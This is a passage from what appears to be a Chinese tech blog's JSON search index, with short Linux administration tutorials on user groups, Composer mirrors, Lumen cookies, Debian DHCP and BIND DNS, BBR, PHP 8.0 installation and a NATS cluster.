命令将现有的用户添加到次要组或附加组？要将现有用户添加到辅助组，请使用带有 -G 选项和组名称的 usermod 命令 语法： 1# usermod [-G] [GroupName] [UserName] 如果系统中不存在给定的用户或组，你将收到一条错误消息。如果没有得到任何错误，那么用户已经被添加到相应的组中 1# usermod -a -G mygroup user1 让我使用 id 命令查看输出。是的，添加成功 12# id user1uid=1008(user1) gid=1008(user1) groups=1008(user1),1012(mygroup) 如何使用 usermod 命令将现有的用户添加到多个次要组或附加组？要将现有用户添加到多个次要组中，请使用带有 -G 选项的 usermod 命令和带有逗号分隔的组名称 语法： 1# usermod [-G] [GroupName1,GroupName2] [UserName] 在本例中，我们将把 user2 添加到 mygroup 和 mygroup1 中 1# usermod -a -G mygroup,mygroup1 user2 让我使用 id 命令查看输出。是的，user2 已成功添加到 myGroup 和 myGroup1 中 12# id user2uid=1009(user2) gid=1009(user2) groups=1009(user2),1012(mygroup),1013(mygroup1) 如何改变用户的主要组？要更改用户的主要组，请使用带有 -g 选项和组名称的 usermod 命令。 语法： 1# usermod [-g] [GroupName] [UserName] 我们必须使用 -g 改变用户的主要组 1# usermod -g mygroup user3 让我们看看输出。是的，已成功更改。现在，显示 user3 主要组是 mygroup 而不是 user3 12# id user3uid=1010(user3) gid=1012(mygroup) groups=1012(mygroup) 使用 gpasswd 命令gpasswd 命令用于管理 /etc/group 和 /etc/gshadow。每个组都可以有管理员、成员和密码 如何使用 gpasswd 命令将现有用户添加到次要组或者附加组？要将现有用户添加到次要组，请使用带有 -M 选项和组名称的 gpasswd 命令。 语法： 1# gpasswd [-M] [UserName] [GroupName] 在本例中，我们将把 user1 添加到 mygroup 中 1# gpasswd -M user1 mygroup 让我使用 id 命令查看输出。是的，user1 已成功添加到 mygroup 中 12# id user1uid=1008(user1) gid=1008(user1) groups=1008(user1),1012(mygroup) 如何使用 gpasswd 命令添加多个用户到次要组或附加组中？要将多个用户添加到辅助组中，请使用带有 -M 选项和组名称的 gpasswd 命令。 语法： 1# gpasswd [-M] [UserName1,UserName2] [GroupName] 在本例中，我们将把 user2 和 user3 添加到 mygroup1 中 1# gpasswd -M user2,user3 mygroup1 让我使用 getent 命令查看输出。是的，user2 和 user3 已成功添加到 myGroup1 中 12# getent group mygroup1mygroup1:x:1013:user2,user3 如何使用 gpasswd 命令从组中删除一个用户？要从组中删除用户，请使用带有 -d 选项的 gpasswd 命令以及用户和组的名称 语法： 1# gpasswd [-d] [UserName] [GroupName] 在本例中，我们将从 mygroup 中删除 user1 12# gpasswd -d user1 mygroupRemoving user user1 from group mygroup","link":"/ops/linux_user/"},{"title":"composer 全局设置阿里云镜像源","text":"首先把默认的源给禁用掉 1composer config -g secure-http false 再修改镜像源 1composer config -g repo.packagist composer https://mirrors.aliyun.com/composer 修改成功后可以先查看一下配置 1composer config -g -l","link":"/backend/composer/"},{"title":"Lumen FAQ","text":"Lumen 增加 Cookie安装 1composer require illuminate/cookie 配置 12345$app-&gt;singleton('cookie', function () use ($app) { return $app-&gt;loadComponent('session', 'Illuminate\\Cookie\\CookieServiceProvider', 'cookie');});$app-&gt;bind('Illuminate\\Contracts\\Cookie\\QueueingFactory', 'cookie');","link":"/backend/lumen/"},{"title":"Debian 部署DHCP服务","text":"DHCP（动态主机配置协议）是一个局域网的网络协议。指的是由服务器控制一段 IP 地址范围，客户机登录服务器时就可以自动获得服务器分配的 IP 地址和子网掩码。 安装执行下面的命令进行安装 1apt install isc-dhcp-server -y 创建自启，并开启服务 12systemctl enable isc-dhcp-serversystemctl start isc-dhcp-server 配置查看配置文件 1cat /etc/default/isc-dhcp-server INTERFACESv4 需要监听的 IPV4 设备 INTERFACESv6 需要监听的 IPV6 设备 假设网卡为 tap_vpn，则将其修改为 123456789101112131415161718# Defaults for isc-dhcp-server (sourced by /etc/init.d/isc-dhcp-server)# Path to dhcpd's config file (default: /etc/dhcp/dhcpd.conf).#DHCPDv4_CONF=/etc/dhcp/dhcpd.conf#DHCPDv6_CONF=/etc/dhcp/dhcpd6.conf# Path to dhcpd's PID file (default: /var/run/dhcpd.pid).#DHCPDv4_PID=/var/run/dhcpd.pid#DHCPDv6_PID=/var/run/dhcpd6.pid# Additional options to start dhcpd with.# Don't use options -cf or -pf here; use DHCPD_CONF/ DHCPD_PID instead#OPTIONS=&quot;&quot;# On what interfaces should the DHCP server (dhcpd) serve DHCP requests?# Separate multiple interfaces with spaces, e.g. &quot;eth0 eth1&quot;.INTERFACESv4=&quot;tap_vpn&quot;INTERFACESv6=&quot;&quot; 然后进一步配置 DHCP 配置，修改 /etc/dhcp/dhcpd.conf 123456789# 假设网络为 10.3.0.0/16# DHCP自动分配 10.3.1.100 ~ 10.3.1.254subnet 10.3.0.0 netmask 255.255.0.0 { range 10.3.1.100 10.3.1.254; option subnet-mask 255.255.0.0; default-lease-time 3600; max-lease-time 7200;} 重启服务 1systemctl restart isc-dhcp-server","link":"/ops/debian_dhcp/"},{"title":"Debian 部署DNS服务","text":"BIND (Berkeley Internet Name Domain) 是一个开源的 DNS 服务器软件，因其稳定性和高品质而广泛用于 Unix/Linux。 它最初由加州大学伯克利分校开发，后来在 1994 年将其开发转移到 Internet Systems Consortium, Inc (ISC)。 安装运行以下命令从默认存储库在 Debian 10 Buster 上安装 BIND 9。 BIND 9 是当前版本，BIND 10 是一个死项目。 12apt updateapt install bind9 bind9utils bind9-doc bind9-host dnsutils 产看版本信息 123named -v// BIND 9.10.3-P4-Debian &lt;id:ebd72b3&gt; 创建自启，并开启服务 12systemctl enable bind9systemctl start bind9 BIND 服务器将作为安装期间创建的绑定用户运行，并侦听 TCP 和 UDP 端口 53，如运行以下命令所示： 12345tcp 0 0 10.1.0.1:53 0.0.0.0:* LISTEN 594/namedtcp 0 0 127.0.0.1:953 0.0.0.0:* LISTEN 594/namedtcp6 0 0 :::53 :::* LISTEN 594/namedudp 0 0 10.1.0.1:53 0.0.0.0:* 594/namedudp6 0 0 :::53 :::* 594/named 通常 DNS 查询发送到 UDP 端口 53。TCP 端口 53 用于响应大小大于 512 字节。 BIND 守护进程被称为 named。 （守护进程是一个在后台运行的软件。）命名二进制文件由 bind9 包安装，还有另一个重要的二进制文件：rndc，远程名称守护进程控制器，由 bind9utils 包安装。 rndc 二进制文件用于重新加载/停止和控制 BIND 守护程序的其他方面。 通信通过 TCP 端口 953 完成。 例如，我们可以检查 BIND 名称服务器的状态。 1rndc status 配置/etc/bind/ 是包含 BIND 配置的目录。 named.conf：主配置文件，包括其他三个文件的配置。 db.127：本地主机 IPv4 反向映射区域文件。 db.local：本地主机转发 IPv4 和 IPv6 映射区域文件。 db.empty：空区域文件 主 BIND 配置文件 /etc/bind/named.conf 从其他 3 个文件中获取设置。 /etc/bind/named.conf.options /etc/bind/named.conf.local /etc/bind/named.conf.default-zones 要启用递归服务，请编辑第一个文件。 1nano /etc/bind/named.conf.options 在选项子句中，添加以下几行。 将 allow-recursion 语句中的 IP 地址替换为您自己的本地网络地址。 123456789101112131415161718192021222324252627options { directory &quot;/var/cache/bind&quot;; recursion yes; listen-on port 53 { 10.1.0.1; }; allow-recursion { 10.1.3.0/24; }; // If there is a firewall between you and nameservers you want // to talk to, you may need to fix the firewall to allow multiple // ports to talk. See http://www.kb.cert.org/vuls/id/800113 // If your ISP provided one or more IP addresses for stable // nameservers, you probably want to use them as forwarders. // Uncomment the following block, and insert the addresses replacing // the all-0's placeholder. // forwarders { // // }; //======================================================================== // If BIND logs error messages about the root key being expired, // you will need to update your keys. See https://www.isc.org/bind-keys //======================================================================== dnssec-validation auto; listen-on-v6 { any; };}; 增加解析配置，可以修改 /etc/bind/named.conf.local 1234zone &quot;developer.com&quot; { type master; file &quot;/etc/bind/zones/db.developer.com.local&quot;;}; 然后修改域名解析 /etc/bind/zones/db.developer.com.local 1234567891011$TTL 604800@ IN SOA ns1.developer.com. admin.developer.com. ( 3 ; Serial 604800 ; Refresh 86400 ; Retry 2419200 ; Expire 604800 ) ; Negative Cache TTL;@ IN NS ns1.developer.com.ns1 IN A 10.1.0.1ping IN A 10.1.3.1 最后重启服务 1systemctl restart bind9","link":"/ops/debian_dns/"},{"title":"开启Google BBR","text":"Google BBR 是一款 Google 开发的拥堵控制算法，通过优化和控制 TCP 的拥塞，充分利用带宽并降低延迟，使得服务器的带宽得到合理化应用 修改系统配置 /etc/sysctl.conf 12net.core.default_qdisc=fqnet.ipv4.tcp_congestion_control=bbr 立即生效 1sysctl -p 查看是否开启 123sysctl net.ipv4.tcp_available_congestion_control# net.ipv4.tcp_available_congestion_control = bbr cubic reno 查看启动 123lsmod | grep bbr# tcp_bbr 20480 14","link":"/ops/bbr/"},{"title":"使用 APT 安装新版本 PHP","text":"用于 Debian 的最新 PHP 版本可在 SURY PHP PPA 存储库中找到。我们将添加存储库作为先决条件，然后在 Debian 10 / Debian 9 上安装 PHP 8.0。 新增 SURY PHP 源123sudo apt -y install lsb-release apt-transport-https ca-certificates sudo wget -O /etc/apt/trusted.gpg.d/php.gpg https://packages.sury.org/php/apt.gpgecho &quot;deb https://packages.sury.org/php/ $(lsb_release -sc) main&quot; | sudo tee /etc/apt/sources.list.d/php.list 更新 APT 源1sudo apt update 安装 PHP1sudo apt -y install php8.0-cli 安装扩展与支持1sudo apt-get install php8.0-{fpm,bcmath,bz2,intl,gd,mbstring,mysql,zip}","link":"/ops/php_apt/"},{"title":"快速组建 Nats 集群","text":"NATS 是个开源、轻量级、高性能的云原生消息系统，实现了具有高度伸缩性的、优雅的发布-订阅（pub/sub）分布式模型。天生具备的高性能，使其成为构建现代、可靠、易伸缩的云原生分布式系统的理想基础。 模拟 3 节点集群，创建 docker-compose.yml 1234567891011121314151617181920212223242526version: &quot;3&quot;services: nats1: image: nats:alpine restart: always command: &quot;-c /etc/node.conf&quot; volumes: - ./etc/node-1.conf:/etc/node.conf ports: - 4222:4222 nats2: image: nats:alpine restart: always command: &quot;-c /etc/node.conf&quot; volumes: - ./etc/node-2.conf:/etc/node.conf ports: - 4223:4222 nats3: image: nats:alpine restart: always command: &quot;-c /etc/node.conf&quot; volumes: - ./etc/node-3.conf:/etc/node.conf ports: - 4224:4222 其中节点配置分别为 1234567891011121314151617181920212223242526272829303132333435# node-1.confport: 4222cluster { listen: &quot;0.0.0.0:6222&quot; routes = [ nats://nats2:6222 nats://nats3:6222 ]}# node-2.confport: 4222cluster { listen: &quot;0.0.0.0:6222&quot; routes = [ nats://nats1:6222 nats://nats3:6222 ]}# node-3.confport: 4222cluster { listen: &quot;0.0.0.0:6222&quot; routes = [ nats://nats1:6222 nats://nats2:6222 ]} 编排服务 1docker-compose up 最后使用 nats-bench 测试 1nats-bench -s nats://localhost:4222,nats://localhost:4223,nats://localhost:4224 -np 1 -ns 1 -n 100000 -ms 16 foo","link":"/ops/nats_cluster/"}],"tags":[{"name":"docker","slug":"docker","link":"/tags/docker/"},{"name":"php","slug":"php","link":"/tags/php/"},{"name":"lumen","slug":"lumen","link":"/tags/lumen/"},{"name":"angular","slug":"angular","link":"/tags/angular/"},{"name":"certbot","slug":"certbot","link":"/tags/certbot/"},{"name":"debian ubuntu","slug":"debian-ubuntu","link":"/tags/debian-ubuntu/"},{"name":"debian","slug":"debian","link":"/tags/debian/"},{"name":"emqx","slug":"emqx","link":"/tags/emqx/"},{"name":"linux","slug":"linux","link":"/tags/linux/"},{"name":"git","slug":"git","link":"/tags/git/"},{"name":"electron","slug":"electron","link":"/tags/electron/"},{"name":"macos","slug":"macos","link":"/tags/macos/"},{"name":"nginx","slug":"nginx","link":"/tags/nginx/"},{"name":"mysql","slug":"mysql","link":"/tags/mysql/"},{"name":"openssl","slug":"openssl","link":"/tags/openssl/"},{"name":"shell","slug":"shell","link":"/tags/shell/"},{"name":"redis","slug":"redis","link":"/tags/redis/"},{"name":"satis","slug":"satis","link":"/tags/satis/"},{"name":"postgsql","slug":"postgsql","link":"/tags/postgsql/"},{"name":"window","slug":"window","link":"/tags/window/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"nodejs","slug":"nodejs","link":"/tags/nodejs/"},{"name":"javascript","slug":"javascript","link":"/tags/javascript/"},{"name":"golang","slug":"golang","link":"/tags/golang/"},{"name":"nats","slug":"nats","link":"/tags/nats/"}],"categories":[{"name":"手记","slug":"手记","link":"/categories/%E6%89%8B%E8%AE%B0/"},{"name":"数据库","slug":"数据库","link":"/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"运维技术","slug":"运维技术","link":"/categories/%E8%BF%90%E7%BB%B4%E6%8A%80%E6%9C%AF/"},{"name":"前端技术","slug":"前端技术","link":"/categories/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/"},{"name":"后端技术","slug":"后端技术","link":"/categories/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/"}]}